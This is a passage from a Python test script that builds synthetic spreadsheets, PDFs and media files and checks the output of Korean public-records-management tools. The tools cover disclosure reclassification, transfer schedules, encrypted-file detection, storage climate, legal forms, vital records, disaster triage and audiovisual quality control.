        ["A-1", "가상 신고", "비공개", "1호 법령상 비밀", "2015", "2023"], ["A-2", "가상 신고2", "비공개", "1호 「공익신고자 보호법」 제12조", "2015", "2019"],
        ["A-3", "가상 인사", "부분공개", "6호 개인정보 성명·주소", "2010", "2024"]])
    r1, or1 = run([S("disclosure-reclass", "scripts", "reclass_candidates.py"), f"{t}/비공개이관.xlsx", "--year", "2026", "--transfer", "-o", f"{t}/산출/이관재분류.xlsx"])
    rw = openpyxl.load_workbook(f"{t}/산출/이관재분류.xlsx")
    defect = [r[0] for r in rw["사유 결함"].iter_rows(min_row=2, values_only=True)]
    pre = {r[0]: r[6] for r in rw["이관 전 재분류"].iter_rows(min_row=2, values_only=True)}
    gw = [p_ for p_ in glob.glob(f"{t}/산출/심의*/평가심의서.xlsx")] or [p_ for p_ in glob.glob(f"{t}/산출/**/평가심의서.xlsx", recursive=True)]
    guide_ok = bool(gw) and "의견 작성 안내" in openpyxl.load_workbook(gw[0]).sheetnames
    check("2026 지침: 1호 비공개는 법령 조항 필요·이관 전 재분류(최근 5년 생략 가능)·평가심의서 '의견 작성 안내'",
          r1 == 0 and defect == ["A-1"] and pre["A-2"] == "이관 전 재분류 필요" and pre["A-1"].startswith("생략 가능") and guide_ok, or1 + str(defect) + str(pre) + str(gw))

    # 2.13: 이관 시기(현행·2027 규정), 비치기록물, 별지 1의2
    xlsx(f"{t}/철목록.xlsx", [["철분류번호", "철제목", "처리과", "처리과코드", "생산연도", "종료연도", "보존기간", "기록물형태", "비치여부", "비치종료일", "기록관이관일", "영구이관일", "이관희망시기"],
                            ["A-1", "예산 철", "기획과", "6410002", 2024, 2024, "준영구", "전자", "", "", "", "", ""],
                            ["A-2", "도면 철", "건축과", "6410005", 2024, 2024, "10년", "비전자", "", "", "", "", ""],
                            ["A-3", "비치 철", "민원과", "6410003", 2019, 2019, "영구", "전자", "비치", "2026-12-20", "", "", ""],
                            ["A-4", "옛 영구", "총무과", "6410001", 2020, 2020, "영구", "전자", "", "", "2021-03-01", "", ""],
                            ["A-5", "연장 철", "총무과", "6410001", 2023, 2023, "5년", "비전자", "", "", "", "", "2028"],
                            ["A-6", "보관 중 비전자", "총무과", "6410001", 2025, 2025, "10년", "비전자", "", "", "", "", ""],
                            ["A-7", "새 영구", "총무과", "6410001", 2021, 2021, "영구", "전자", "", "", "2022-03-01", "", ""]])
    c1, o1 = run([S("transfer-schedule", "scripts", "transfer_schedule.py"), f"{t}/철목록.xlsx", "--today", "2026-11-20", "-o", f"{t}/산출/이관_현행.xlsx"])
    c2, o2 = run([S("transfer-schedule", "scripts", "transfer_schedule.py"), f"{t}/철목록.xlsx", "--today", "2027-02-01", "--year", "2027", "-o", f"{t}/산출/이관_2027.xlsx"])
    ok_ts = False
    if c1 == 0 and c2 == 0:
        w1 = openpyxl.load_workbook(f"{t}/산출/이관_현행.xlsx")
        w2 = openpyxl.load_workbook(f"{t}/산출/이관_2027.xlsx")
        st1 = {r[1]: (r[11], r[12], r[13], r[14]) for r in w1["이관 일정"].iter_rows(min_row=2, values_only=True)}
        st2 = {r[1]: (r[11], r[14]) for r in w2["이관 일정"].iter_rows(min_row=2, values_only=True)}
        ext2 = [r[2] for r in w2["연장 목록(별지 1의2)"].iter_rows(min_row=4, values_only=True) if r[0] and str(r[0]).isdigit()]
        bichi1 = [r[6] for r in w1["비치기록물"].iter_rows(min_row=2, values_only=True)]
        ok_ts = (st1["A-1"][0] == "기한 지남" and st1["A-2"][0] == "2026년 이관" and st2["A-2"][0] == "기한 지남"
                 and st2["A-6"][0] == "2027년 이관" and "부칙 제16조①" in (st2["A-6"][1] or "")
                 and st1["A-4"][1] == 2031 and "부칙 제17조①" in (st1["A-4"][3] or "") and st1["A-7"][1] == 2027 and st1["A-3"][2].startswith("비치 중")
                 and st2["A-5"][0] == "연장 한도 넘음" and "A-2" in ext2 and bichi1 == ["연장 신청 기한 지남(종료 60일 전)"])
    check("이관 시기: 현행·2027 규정, 경과조치(부칙 제16조·제17조), 비치 연장 신청 기한, 영구 이관 연도, 별지 1의2 목록", ok_ts, o1 + o2)

    # 암호화 기록물 목록(제31조의2)
    import pypdf
    os.makedirs(f"{t}/이관폴더/비밀", exist_ok=True)
    pw = pypdf.PdfWriter(); pw.add_blank_page(100, 100); pw.encrypt("x"); pw.write(f"{t}/이관폴더/잠김.pdf")
    pw = pypdf.PdfWriter(); pw.add_blank_page(100, 100); pw.write(f"{t}/이관폴더/보통.pdf")
    hdr = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 504
    with open(f"{t}/이관폴더/암호.hwp", "wb") as f:
        f.write(hdr + b"HWP Document File" + b"\0" * 15 + b"\x00\x00\x05\x05" + (2).to_bytes(4, "little") + b"\0" * 216)
    with open(f"{t}/이관폴더/drm.docx", "wb") as f:
        f.write(b"SCD0003" + b"\0" * 100)
    with open(f"{t}/이관폴더/비밀/x.pdf", "wb") as f:
        f.write(b"%PDF /Encrypt")
    ce, oe = run([S("transfer-schedule", "scripts", "encrypted_scan.py"), f"{t}/이관폴더", "-o", f"{t}/산출/암호화.xlsx"])
    enc = [r[1] for r in openpyxl.load_workbook(f"{t}/산출/암호화.xlsx").worksheets[0].iter_rows(min_row=2, values_only=True)] if ce == 0 else []
    check("암호화 기록물: PDF·HWP 암호·문서 DRM 헤더(2018 연구) 찾음, 보통 파일·비밀 폴더 제외", ce == 0 and sorted(enc) == ["drm.docx", "암호.hwp", "잠김.pdf"], oe + str(enc))

    # 서고 환경(시행령 별표 6)
    import datetime as _dt
    with open(f"{t}/온습도.csv", "w", encoding="cp949", newline="") as f:
        cw = csv.writer(f)
        cw.writerow(["측정일시", "서고", "온도(℃)", "습도(%)"])
        for i in range(48):
            tt = (_dt.datetime(2026, 10, 1) + _dt.timedelta(hours=i)).strftime("%Y-%m-%d %H:%M")
            cw.writerow([tt, "1서고", "20.5", "62" if 10 <= i < 40 else "50"])
            cw.writerow([tt, "2서고", "15.2", "41"])
    cv, ov = run([S("stack-environment", "scripts", "env_check.py"), f"{t}/온습도.csv", "--org", "특수기록관", "--media", "2서고=자기",
                  "--books", "20000", "--area", "150", "-o", f"{t}/산출/서고환경.xlsx"])
    ok_env = False
    if cv == 0:
        we = openpyxl.load_workbook(f"{t}/산출/서고환경.xlsx")
        sm = {r[0]: r for r in we["요약"].iter_rows(min_row=2, values_only=True)}
        area = [r for r in we["서고 면적"].iter_rows(values_only=True)]
        ok_env = (sm["1서고"][7] == 62.5 and sm["1서고"][9] == 29 and str(sm["1서고"][13]).startswith("조치 필요")
                  and sm["2서고"][3] == "40±5%" and str(sm["2서고"][13]).startswith("기준 안") and "198.0㎡" in str(area[1][1]) and "부족" in str(area[2][2]))
        nzr = [r for r in we["참고 해외 기준"].iter_rows(min_row=2, values_only=True) if r and r[0]] if "참고 해외 기준" in we.sheetnames else []
        ok_env = ok_env and any(r[0] == "1서고" and r[2].startswith("NISO") for r in nzr) and not any(r[0] == "2서고" and r[2].startswith("NISO") for r in nzr) \
            and any(r[0] == "2서고" and r[2].startswith("NAA") and "18±2℃" in r[5] for r in nzr) and any("NZ" in r[2] for r in nzr)
    check("서고 환경: 별표 6 매체별 기준, 이탈 시간, 면적 계산, 해외 기준(NISO TR01·NZ S2·NAA) 참고 비교", ok_env, ov)

    # 법정 서식: 색인목록 쪽표시·100매, 반출 30년 이상 경고, 폐기 금지 요청서
    xlsx(f"{t}/색인원본.xlsx", [["철분류번호", "철제목", "생산연도", "생산일자", "등록번호", "제목", "쪽수", "기록물형태", "보존기간"],
                              ["A-1", "예산 철", 2025, "2025-01-10", "기획과-1", "문서 1", 3, "전자", "영구"],
                              ["A-1", "예산 철", 2025, "2025-02-10", "기획과-2", "문서 2", 1, "전자", "영구"],
                              ["A-1", "예산 철", 2025, "2025-03-10", "기획과-3", "문서 3", 99, "전자", "영구"]])
    ci, oi = run([S("records-forms", "scripts", "make_form.py"), "index", "--list", f"{t}/색인원본.xlsx", "-o", f"{t}/산출/색인.xlsx"])
    cc, oc = run([S("records-forms", "scripts", "make_form.py"), "carry", "--list", f"{t}/색인원본.xlsx", "-o", f"{t}/산출/반출.xlsx"])
    ch, oh = run([S("records-forms", "scripts", "make_form.py"), "hold", "--set", "기관명=가상시", "-o", f"{t}/산출/폐기금지.xlsx"])
    ok_f = False
    if ci == 0 and cc == 0 and ch == 0:
        wi = openpyxl.load_workbook(f"{t}/산출/색인.xlsx")
        marks = [r[6] for r in wi["서식"].iter_rows(values_only=True) if isinstance(r[0], int)]
        warn_i = " ".join(str(r[2]) for r in wi["빈칸 점검"].iter_rows(values_only=True))
        warn_c = " ".join(str(r[2]) for r in openpyxl.load_workbook(f"{t}/산출/반출.xlsx")["빈칸 점검"].iter_rows(values_only=True))
        hold_t = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/폐기금지.xlsx")["서식"].iter_rows(values_only=True) for c in r if c)
        ok_f = (marks == ["1-3", "4", "5-103"] and "103매" in warn_i and "제32조" in warn_c and "국가기록원장 귀하" in hold_t and "별지 제11호의2" in hold_t)
    check("법정 서식: 색인목록 쪽표시·100매, 반출 제한 경고, 폐기 금지 요청서", ok_f, oi + oc + oh)
    xlsx(f"{t}/연장원본.xlsx", [["처리과코드", "철분류번호", "철제목", "생산연도", "이관희망연도", "연장사유"],
                              ["1234567", "C-1", "가상 사업철", "2024", "2028", "후속 사업 추진에 따라 업무 참고 필요"],
                              ["1234567", "C-2", "가상 대장", "2024", "2024", "필요"], ["1234567", "C-3", "", "2024", "2027", ""]])
    ce, oe = run([S("records-forms", "scripts", "make_form.py"), "extend", "--list", f"{t}/연장원본.xlsx", "--set", "기관명=가상시", "-o", f"{t}/산출/연장.xlsx"])
    ew = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/연장.xlsx")["빈칸 점검"].iter_rows(values_only=True) for c in r if c) if ce == 0 else ""
    ca_, oa_ = run([S("records-forms", "scripts", "make_form.py"), "annotate", "--set", "기관명=가상시", "-o", f"{t}/산출/부기.xlsx"])
    at = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/부기.xlsx")["서식"].iter_rows(values_only=True) for c in r if c) if ca_ == 0 else ""
    xlsx(f"{t}/촬영원본.xlsx", [["철분류번호", "철제목", "쪽수", "시작", "끝"], ["F-1", "가상 대장", "120", "1", "120"], ["F-2", "", "", "121", "180"]])
    cmf, omf = run([S("records-forms", "scripts", "make_form.py"), "microfilm", "--list", f"{t}/촬영원본.xlsx", "--set", "필름번호=MF-1", "-o", f"{t}/산출/촬영.xlsx"])
    clm, olm = run([S("records-forms", "scripts", "make_form.py"), "limited", "--set", "성명(기관·단체명)=가상", "-o", f"{t}/산출/제한열람.xlsx"])
    lmt = " ".join(str(c) for r in openpyxl.load_workbook(f"{t}/산출/제한열람.xlsx")["서식"].iter_rows(values_only=True) for c in r if c) if clm == 0 else ""
    mft = [r for r in openpyxl.load_workbook(f"{t}/산출/촬영.xlsx")["서식"].iter_rows(values_only=True)] if cmf == 0 else []
    check("법정 서식 별지 제5호(마이크로필름 촬영계획서)·제14호(제한적 열람신청서, 주민등록번호는 파일에 안 적음)",
          any(r[0] == "F-1" and r[4] == "1" for r in mft) and "제37조①" in lmt and "주민등록번호는 이 파일에 적지 않고" in lmt and "주민등록번호\"" not in lmt
          and "소속" in lmt, omf + olm)
    check("부기·정정 요청서: 처리 방법(훈령 제224호 3단계·시행규칙 제14조 두 선)·조문 번호 차이 안내", ca_ == 0
          and "두 선" in at and "보존매체에도" in at and "제62조의3" in at, oa_)
    check("법정 서식 별지 제1호의2(2027 시행): 이관 기간 연장·일정 연기 목록 빈칸·희망시기·사유", ce == 0
          and "C-3" in ew and "사유 비어" in ew and "늦지 않음" in ew and "사유가 짧음" in ew and "C-1" not in ew, oe + ew)

    # 보존상자 편성·표지(별표 6)
    xlsx(f"{t}/상자원본.xlsx", [["철분류번호", "철제목", "생산연도", "보존기간", "단위과제명", "쪽수", "처리과"],
                              ["B-1", "가", 2025, "준영구", "예산편성", 600, "기획과"], ["B-2", "나", 2025, "준영구", "예산편성", 500, "기획과"],
                              ["B-3", "다", 2025, "10년", "청사관리", 80, "총무과"], ["B-4", "라", 2024, "준영구", "예산편성", 90, "기획과"]])
    cb, ob = run([S("box-labels", "scripts", "box_labels.py"), f"{t}/상자원본.xlsx", "--prefix", "T-", "-o", f"{t}/산출/상자"])
    ok_b = False
    if cb == 0:
        wb_ = openpyxl.load_workbook(f"{t}/산출/상자/보존상자_편성안.xlsx")
        boxes = [(r[0], r[1], r[2], r[5]) for r in wb_["편성안"].iter_rows(min_row=2, values_only=True) if r[0]]
        warn_b = " ".join(str(r[3]) for r in wb_["확인할 것"].iter_rows(values_only=True))
        html_ok = os.path.exists(f"{t}/산출/상자/보존상자_표지.html") and "업무명" in open(f"{t}/산출/상자/보존상자_표지.html", encoding="utf-8").read()
        ok_b = (boxes == [("T-001", "2024", "준영구", 1), ("T-002", "2025", "준영구", 1), ("T-003", "2025", "준영구", 1), ("T-004", "2025", "10년", 1)]
                and "600매" in warn_b and html_ok)
    check("보존상자: 연도·보존기간·단위과제별 편성, 상자 분량, 100매 경고, 표지 HTML", ok_b, ob)

    # 보완: 별지 13의2, 간행물 15일, 정리 점검 100매·수정 이력
    xlsx(f"{t}/재분류결과.xlsx", [["관리번호", "제목", "생산연도", "공개구분", "비공개사유", "재분류결과", "재분류연도"],
                                ["1", "가", "1990", "비공개", "6호 사생활 정보", "비공개", "2026"],
                                ["2", "나", "2000", "비공개", "5호, 6호 감사 진행", "비공개", "2026"],
                                ["3", "다", "2001", "비공개", "1호 「공익신고자 보호법」 제12조", "부분공개", "2026"]])
    cr, orr = run([S("disclosure-reclass", "scripts", "reclass_candidates.py"), f"{t}/재분류결과.xlsx", "--year", "2026", "-o", f"{t}/산출/재분류13.xlsx"])
    f13 = [r for r in openpyxl.load_workbook(f"{t}/산출/재분류13.xlsx")["별지 13의2"].iter_rows(values_only=True)] if cr == 0 else []
    check("공개 재분류: 별지 13의2 총 건수·호별 건수(주요 사유)", cr == 0 and list(f13[2][:9]) == [2, 0, 0, 0, 0, 1, 1, 0, 0], orr + str(f13[2:3]))
    xlsx(f"{t}/간행물15.xlsx", [["제목", "발간등록번호", "발행일", "형태", "유형", "송부일", "송부부수", "PDF송부"],
                              ["백서", "51-6410000-000123-10", "2026-01-02", "책자", "연속간행물", "2026-02-20", 3, "Y"],
                              ["정상", "51-6410000-000125-01", "2026-03-01", "책자", "단행본", "2026-03-10", 3, "Y"]])
    cp_, op_ = run([S("publications-check", "scripts", "pubs_check.py"), f"{t}/간행물15.xlsx", "--year", "2026", "--today", "2026-11-20", "-o", f"{t}/산출/간행물15.xlsx"])
    pj = {r[1]: r[-1] for r in openpyxl.load_workbook(f"{t}/산출/간행물15.xlsx")["점검"].iter_rows(min_row=2, values_only=True)} if cp_ == 0 else {}
    check("간행물: 발간 후 15일 송부 기한(시행령 제55조④)", "49일" in str(pj.get("백서")) and pj.get("정상") == "통과", op_ + str(pj))
    xlsx(f"{t}/정리등록.xlsx", [["철분류번호", "등록번호", "제목", "생산연도", "보존기간", "단위과제", "쪽수", "공개구분", "기록물형태", "권호수", "수정일자", "수정내용", "수정사유"],
                              ["C", "C-1", "가 철", "2025", "10년", "가", "70", "공개", "비전자", "1", "", "", ""],
                              ["C", "C-2", "가 철", "2025", "10년", "가", "50", "공개", "비전자", "1", "2026-01-05", "제목 오타", ""]])
    xlsx(f"{t}/정리실물.xlsx", [["상자번호", "철분류번호", "실물쪽수"], ["1", "C", "120"]])
    cg, og = run([S("records-register-audit", "scripts", "register_audit.py"), f"{t}/정리등록.xlsx", f"{t}/정리실물.xlsx", "-o", f"{t}/산출/정리100.xlsx"])
    kinds = [r[0] for r in openpyxl.load_workbook(f"{t}/산출/정리100.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True)] if cg == 0 else []
    check("정리 점검: 철당 100매 초과, 수정 이력(일자·내용·사유) 누락", "철 분량" in kinds and "수정 이력" in kinds, og + str(kinds))

    # 서고 환경 NAK 11: 매수·서가 길이 환산, 규모, 검·교정 1년
    cn, on_ = run([S("stack-environment", "scripts", "env_check.py"), f"{t}/온습도.csv", "--pages", "250050", "--shelf-m", "30", "--area", "320",
                   "--calibrated", "2025-10-01", "--today", "2026-11-20", "--video", "20000", "--workers", "3", "--newbuild", "--completed", "2026-08-01",
                   "-o", f"{t}/산출/서고NAK11.xlsx"])
    ok_n = False
    if cn == 0:
        wn = openpyxl.load_workbook(f"{t}/산출/서고NAK11.xlsx")
        ar_ = {r[0]: r for r in wn["서고 면적"].iter_rows(values_only=True)}
        ck_ = [r for r in wn["서고 점검표(NAK 11)"].iter_rows(values_only=True)]
        ok_n = (ar_["권 수(매수 환산)"][1] == "2,501권" and ar_["권 수(서가 길이 환산)"][1] == "1,500~2,000권" and ar_["서고 규모"][1] == "대형"
                and any(r[0] == "검·교정" and r[2] == "부적합" for r in ck_) and any("8.5~15cm" in str(r[1]) for r in ck_) and ar_["필요 면적(비디오)"][1] == "90.0㎡" and ar_["필요 면적(작업실)"][1] == "21.0㎡"
                and any(r[0] == "입고 가능" and "2027-02-01" in str(r[1]) and r[2] == "아직 이름" for r in wn["신축 점검표(NAK 24)"].iter_rows(values_only=True)))
    check("서고 환경 NAK 11: 100매=1권·15~20mm 환산, 대형 서고, 검·교정 1년 지남, 점검표", ok_n, on_)

    # 필수기록물(NAK 2-2): 판정 규칙, 보호기간 ≤ 보존기간, 복본·분산·10km
    xlsx(f"{t}/단위과제.xlsx", [["분류체계", "단위과제명", "업무설명", "보존기간", "기능성", "고유성", "증거성", "보호기간", "판단사유"],
                             ["안전", "비상연락망 관리", "", "10년", 5, 0, 0, "1년", "즉시"],
                             ["토지", "지적 관리", "", "영구", 1, 3, 3, "영구", "권리"],
                             ["총무", "행사 홍보", "", "3년", 3, 1, 1, "", ""],
                             ["계약", "계약 관리", "", "5년", 3, 3, 0, "10년", "계약"],
                             ["인사", "인사 관리", "", "준영구", "", 3, "", "", ""]])
    xlsx(f"{t}/필수철.xlsx", [["단위과제명", "철명", "관리번호", "이중매체", "보호기간(만료일)", "분산장소", "원격거리km"],
                            ["비상연락망 관리", "연락망", "V-1", "", "2027-01-31", "본관", ""],
                            ["지적 관리", "지적공부", "V-2", "마이크로필름", "2099-12-31", "본관;분원", "35"],
                            ["계약 관리", "계약철", "V-3", "광디스크", "2025-12-31", "본관;별관", "2"],
                            ["행사 홍보", "홍보철", "V-4", "", "", "", ""]])
    xlsx(f"{t}/필수피해.xlsx", [["관리번호", "피해정도", "피해내용"], ["V-1", "심각", "소실"], ["V-2", "3", "그을림"], ["V-3", "높음", "눌러붙음"], ["X-9", "2", ""]])
    cvr, ovr = run([S("vital-records", "scripts", "vital_records.py"), f"{t}/단위과제.xlsx", "--files", f"{t}/필수철.xlsx", "--year", "2026",
                    "--today", "2026-11-20", "--damage", f"{t}/필수피해.xlsx", "--set", "발생일=2026-07-24", "-o", f"{t}/산출/필수.xlsx"])
    ok_v = False
    if cvr == 0:
        wv = openpyxl.load_workbook(f"{t}/산출/필수.xlsx")
        ev_ = {r[1]: r for r in wv["필수성 평가표"].iter_rows(min_row=3, values_only=True)}
        pr_ = {r[0]: str(r[6] or "") for r in wv["보호 점검"].iter_rows(min_row=2, values_only=True)}
        sc_ = " ".join(str(c) for r in wv["일정·기준"].iter_rows(values_only=True) for c in r if c)
        ok_v = ([ev_[k][6] for k in ("비상연락망 관리", "지적 관리", "행사 홍보", "계약 관리", "인사 관리")] == ["필수", "필수", "해당 없음", "필수", "평가 필요"]
                and "보존기간 이하" in str(ev_["계약 관리"][10]) and set(pr_) == {"V-1", "V-2", "V-3"}
                and "복본" in pr_["V-1"] and "두 곳" in pr_["V-1"] and pr_["V-2"] == "" and "10km" in pr_["V-3"] and "만료" in pr_["V-3"]
                and "2026-10-31" in sc_ and "지남" in sc_)
        dv_ = {r[2]: r for r in wv["피해 평가표"].iter_rows(min_row=6, values_only=True) if r and r[2]}
        rc_ = [(r[3], r[4]) for r in wv["업무복구 목록"].iter_rows(min_row=2, values_only=True) if isinstance(r[0], int)]
        ok_v = ok_v and (dv_["V-1"][4] == "심각(5)" and "복본 없음" in str(dv_["V-1"][9]) and "목록" in str(dv_["X-9"][9])
                         and rc_ == [("V-1", None), ("V-3", "광디스크"), ("V-2", "마이크로필름")] and "이용 대장" in wv.sheetnames)
    check("필수기록물: 판정, 보호기간>보존기간, 복본·분산·10km·만료, 10/31, 피해 5단계·업무복구 순위", ok_v, ovr)

    # 재난 응급복구(NAK 38): 곰팡이 우선·48시간·냉동동결·습식 불가, 대피 우선순위 후보
    xlsx(f"{t}/피해.xlsx", [["관리번호", "제목", "보존기간", "대피등급", "재질", "제본", "훼손유형", "위치", "발견일시", "비고"],
                          ["R-1", "토지대장", "영구", "1", "낱장", "무", "완전침수", "1서고", "2026-07-15 09:00", ""],
                          ["R-2", "사진첩", "준영구", "1", "코팅", "유", "부분침수", "1서고", "2026-07-15 09:00", ""],
                          ["R-3", "회의록", "10년", "2", "서적", "유", "곰팡이", "2서고", "2026-07-15 09:00", ""],
                          ["R-4", "공문", "3년", "3", "낱장", "무", "부분침수", "3서고", "2026-07-13 09:00", "수용성 잉크"]])
    cdr, odr = run([S("disaster-recovery", "scripts", "disaster_triage.py"), f"{t}/피해.xlsx", "--now", "2026-07-16 06:00", "--room", "23,68", "-o", f"{t}/산출/응급.xlsx"])
    cpr, opr = run([S("disaster-recovery", "scripts", "disaster_triage.py"), f"{t}/피해.xlsx", "--prepare", "-o", f"{t}/산출/대피.xlsx"])
    ok_d = False
    if cdr == 0 and cpr == 0:
        rows_ = [r for r in openpyxl.load_workbook(f"{t}/산출/응급.xlsx")["응급복구 순서"].iter_rows(min_row=2, values_only=True)]
        byid = {r[1]: r for r in rows_}
        lab_ = {r[0]: r for r in openpyxl.load_workbook(f"{t}/산출/응급.xlsx")["포장 라벨"].iter_rows(min_row=2, values_only=True)}
        wd_ = openpyxl.load_workbook(f"{t}/산출/응급.xlsx")
        stD = {r[0]: r for r in wd_["상태 체크리스트(부속서 D)"].iter_rows(min_row=2, values_only=True)}
        assert "건조 방식·외부 위탁" in wd_.sheetnames and any("1.2입방피트" in str(r[1]) for r in wd_["건조 방식·외부 위탁"].iter_rows(values_only=True))
        envE = " ".join(str(c) for r in wd_["작업공간(부속서 E)"].iter_rows(values_only=True) for c in r if c)
        kitA = [r[1] for r in wd_["물품·장비(부속서 A)"].iter_rows(min_row=2, values_only=True)]
        ok_annex = (stD["R-2"][1] == "③" and stD["R-3"][2] == "E" and stD["R-3"][4] == "○" and stD["R-1"][7] == 3 and stD["R-1"][6] == "1"
                    and "진공건조 절대 금지" in str(byid["R-2"][11]) and "부적합" in envE and "60%" in envE and "지퍼백" in kitA)
        ok_d = ok_annex and ([r[1] for r in rows_] == ["R-3", "R-1", "R-2", "R-4"] and byid["R-4"][7] == "지남" and "즉시 냉동동결" in byid["R-4"][8]
                and "분리" in byid["R-3"][8] and "15 kGy" in byid["R-3"][8] and "kGy" not in str(byid["R-2"][8]) and "습식" in byid["R-2"][9] and "습식" in byid["R-4"][9] and lab_["R-3"][5] == "유" and lab_["R-3"][8] == "동결")
    xlsx(f"{t}/매체피해.xlsx", [["관리번호", "제목", "보존기간", "대피등급", "재질", "훼손유형", "발견일시"],
                            ["M-1", "필름", "영구", "1", "마이크로필름", "완전침수", "2026-07-13 09:00"],
                            ["M-2", "사진", "영구", "1", "사진", "침수", "2026-07-15 09:00"],
                            ["M-3", "테이프", "영구", "2", "자기테이프", "부분침수", "2026-07-13 09:00"]])
    cmr, omr = run([S("disaster-recovery", "scripts", "disaster_triage.py"), f"{t}/매체피해.xlsx", "--now", "2026-07-16 06:00", "-o", f"{t}/산출/매체.xlsx"])
    if cmr == 0:
        mm = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/매체.xlsx")["응급복구 순서"].iter_rows(min_row=2, values_only=True)}
        ok_d = ok_d and (mm["M-1"][6] == "2026-07-16 09:00" and "깨끗한 물" in mm["M-1"][8] and mm["M-2"][7] == "51시간" and "진공건조 금지" in mm["M-2"][8]
                         and mm["M-3"][7] == "지남" and "-10℃" in mm["M-3"][8])
    else:
        ok_d = False
    check("재난 응급복구: 곰팡이 먼저·등급·심각도 순, 48시간 즉시 동결, 습식 불가, 라벨, 재질별 건조, 부속서 A·D·E, 필름·사진·테이프 72·48시간(NAK 2-1)", ok_d, odr + opr)

    # 보안·재난관리(NAK 2-1): 위험 점수, 연 1회 검토, 임무카드 빈칸, 비상용품 기한, RTO·RPO Tier
    xlsx(f"{t}/위험.xlsx", [["구분", "위협", "발생가능성", "위험도", "대책"], ["자연재해", "홍수", 4, 5, ""], ["기술적 재해", "정전", 2, 3, "UPS"], ["인적 재해", "해킹", "높음", "매우높음", "망분리"]])
    xlsx(f"{t}/직원.xlsx", [["이름", "소속", "재난시반", "재난시업무", "대행", "휴대폰"], ["가", "보존과", "통제반", "포장", "나", "010"], ["다", "보존과", "", "", "", ""]])
    xlsx(f"{t}/용품.xlsx", [["품명", "보존위치", "수량", "유통기한"], ["지퍼백", "출입구", "200", "2030-01-01"], ["마스크", "", "0", "2026-10-01"]])
    xlsx(f"{t}/업무영향.xlsx", [["업무프로세스", "RTO(시간)", "RPO"], ["보존", "4", "최종시점"], ["열람", "24", "D-1"], ["통계", "10일", "D-1"]])
    csd, osd = run([S("security-disaster-plan", "scripts", "sd_plan.py"), "--org", "영구", "--risk", f"{t}/위험.xlsx", "--staff", f"{t}/직원.xlsx",
                    "--supplies", f"{t}/용품.xlsx", "--bia", f"{t}/업무영향.xlsx", "--last-review", "2025-10-01", "--today", "2026-11-20", "-o", f"{t}/산출/보안재난.xlsx"])
    ok_sd = False
    if csd == 0:
        ws_ = openpyxl.load_workbook(f"{t}/산출/보안재난.xlsx")
        rk_ = [r for r in ws_["위험평가표"].iter_rows(min_row=2, values_only=True) if r[1]]
        mc_ = {r[0]: r for r in ws_["임무카드(부속서 D)"].iter_rows(min_row=2, values_only=True)}
        su_ = {r[1]: r for r in ws_["비상용품 대장(표 5)"].iter_rows(min_row=3, values_only=True) if isinstance(r[0], int)}
        bi_ = {r[0]: (r[3], r[4]) for r in ws_["RTO·RPO(표 7)"].iter_rows(min_row=2, values_only=True)}
        lastrow = [r for r in ws_["보안 체크리스트"].iter_rows(values_only=True)][-1]
        ok_sd = (rk_[0][5] == 20 and "대책 없음" in str(rk_[0][8]) and rk_[1][5] == 20 and rk_[2][6] == "낮음" and "빈칸" in str(mc_["다"][8])
                 and "유통기한 지남" in str(su_["마스크"][7]) and bi_["보존"] == ("Tier 1", "HOT") and bi_["열람"] == ("Tier 4", "WARM")
                 and bi_["통계"] == ("Tier 6", "없음") and lastrow[2] == "지남")
    check("보안·재난관리: 위험 점수·정렬, 연 1회 검토 지남, 임무카드 빈칸, 비상용품 기한, RTO·RPO Tier", ok_sd, osd)

    # 시청각 디지털화(NAK 26 표 9~11): ffmpeg가 있을 때만
    if shutil.which("ffmpeg") and shutil.which("ffprobe"):
        av = f"{t}/av"
        os.makedirs(av)
        ff = lambda *x: subprocess.run(["ffmpeg", "-v", "error", "-y", *x], capture_output=True)
        ff("-f", "lavfi", "-i", "testsrc=size=1920x1080:rate=25:duration=1", "-f", "lavfi", "-i", "sine=sample_rate=48000:duration=1",
           "-c:v", "ffv1", "-pix_fmt", "yuv422p", "-c:a", "flac", "-sample_fmt", "s32", f"{av}/hd.mkv")
        ff("-f", "lavfi", "-i", "testsrc=size=1280x720:rate=25:duration=1", "-f", "lavfi", "-i", "sine=sample_rate=44100:duration=1",
           "-c:v", "libx264", "-b:v", "1M", "-pix_fmt", "yuv420p", "-c:a", "aac", f"{av}/low.mp4")
        cav, oav = run([S("scan-qc", "scripts", "av_qc.py"), av, "--kind", "비디오HD", "-o", f"{t}/산출/av.csv"])
        ar_ = {r[0]: r for r in list(csv.reader(open(f"{t}/산출/av.csv", encoding="utf-8-sig")))[1:]} if os.path.exists(f"{t}/산출/av.csv") else {}
        check("시청각 디지털화 NAK 26: HD FFV1/FLAC 통과, 720p·0.4Mbps·44.1kHz 재작업",
              ar_.get("hd.mkv", [""])[-1] == "통과" and ar_.get("low.mp4", [""])[-1] == "재작업 후보" and "10Mbps" in ar_.get("low.mp4", [""] * 12)[10], oav)
        av2 = f"{t}/av2"
        os.makedirs(av2)
        ff("-f", "lavfi", "-i", "color=black:s=320x240:d=3", "-f", "lavfi", "-i", "testsrc=s=320x240:d=3", "-f", "lavfi", "-i", "anullsrc=r=48000:cl=mono",
           "-filter_complex", "[0:v][1:v]concat=n=2:v=1:a=0[v]", "-map", "[v]", "-map", "2:a", "-t", "6", "-c:v", "ffv1", "-c:a", "flac", f"{av2}/blk.mkv")
        ff("-f", "lavfi", "-i", "sine=f=440:r=48000:d=3,volume=20", "-c:a", "flac", "-sample_fmt", "s32", f"{av2}/loud.flac")
        run([S("scan-qc", "scripts", "av_qc.py"), av2, "--kind", "비디오SD", "--content", "-o", f"{t}/산출/av2.csv"])
        cc_ = [(r[0], r[1]) for r in list(csv.reader(open(f"{t}/산출/av2_내용검사.csv", encoding="utf-8-sig")))[1:]] if os.path.exists(f"{t}/산출/av2_내용검사.csv") else []
        check("시청각 내용 검사 --content: 블랙·정지·무음·클리핑과 원인(시청각물 품질오류 연구)",
              {("blk.mkv", "블랙"), ("blk.mkv", "무음"), ("loud.flac", "클리핑")} <= set(cc_), str(cc_))

    # 처분결과 관리·폐기 집행 점검(NAK 5-1 7.5~8.4)
